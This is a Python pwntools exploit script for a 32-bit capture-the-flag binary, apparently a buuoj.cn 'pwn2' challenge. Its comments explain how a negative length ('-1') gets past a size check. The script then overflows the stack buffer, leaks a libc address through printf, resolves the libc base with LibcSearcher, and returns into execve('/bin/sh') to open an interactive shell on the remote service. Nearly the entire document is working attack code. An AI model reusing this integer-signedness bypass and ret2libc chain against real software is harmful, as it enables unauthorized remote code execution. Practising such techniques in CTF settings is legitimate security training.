from pwn import *
from LibcSearcher import *
context.arch='i386'

# p = process('./pwn2')
p = remote('node3.buuoj.cn',27048)
elf = ELF('./pwn2')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')

p.recvuntil("How many bytes do you want me to read? ")
p.sendline('-1')
# pass the judgement 'if ( v2 > 32 )',
# the function of get_n gets a number which class is unsigned int, 
# so just input a negative like '-1',
# it could pass the judgement and will be transffer to 0xff by system,
# so, we can change the input length by this way
sleep(0.1)
p.recvuntil("data!\n")

payload = 'A'*(0x2c+4)
# payload += flat([elf.sym['printf'], elf.sym['main'], elf.got['printf']])
payload += flat([elf.sym['printf'], elf.sym['main'], elf.got['__libc_start_main']])
p.sendline(payload)
p.recvuntil('\n')
# leak the libc address to get shell

# printf_addr = u32(p.recv(4).ljust(4,'\x00'))
# log.success('printf_addr = %#x',printf_addr)

main_addr = u32(p.recv(4).ljust(4,'\x00'))
log.success('main = %#x',main_addr)

# system_addr = printf_addr - (libc.sym['printf'] - libc.sym['system'])
# binsh = printf_addr - (libc.sym['printf'] - next(libc.search('/bin/sh')))

# libc = LibcSearcher('printf',printf_addr)
# libc_base = printf_addr - libc.dump('printf')
libc = LibcSearcher('__libc_start_main',main_addr)
libc_base = main_addr - libc.dump('__libc_start_main')
# system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
# log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))
execve_addr = libc_base + libc.dump('execve')
log.info('execve_addr = %#x, binsh = %#x'%(execve_addr,binsh))

p.recvuntil("How many bytes do you want me to read? ")
p.sendline('-1')
sleep(0.1)
p.recvuntil("data!\n")

payload = 'A'*(0x2c+0x4)
# payload += flat([system_addr, elf.sym['main'], binsh])
payload += flat([execve_addr, elf.sym['main'], binsh, 0, 0])
p.sendline(payload)
# sleep(1)
p.interactive()

# ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)